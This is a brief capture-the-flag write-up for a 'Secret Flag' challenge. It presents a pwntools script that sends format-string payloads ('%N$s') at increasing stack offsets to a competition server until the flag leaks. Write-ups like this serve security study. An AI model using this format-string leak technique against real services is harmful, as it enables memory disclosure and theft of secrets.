# Secret Flag
The flag is stored somewhere on the flag, so I just iterated through different offsets until I found it.

```python
from pwn import *

for x in range(10):
    p = remote('2020.redpwnc.tf', 31826, level='error')
    p.clean(0.2)

    p.sendline(f'%{x}$s')

    resp = p.clean().decode('latin-1')

    if 'flag' in resp:
        print(resp)
        break
```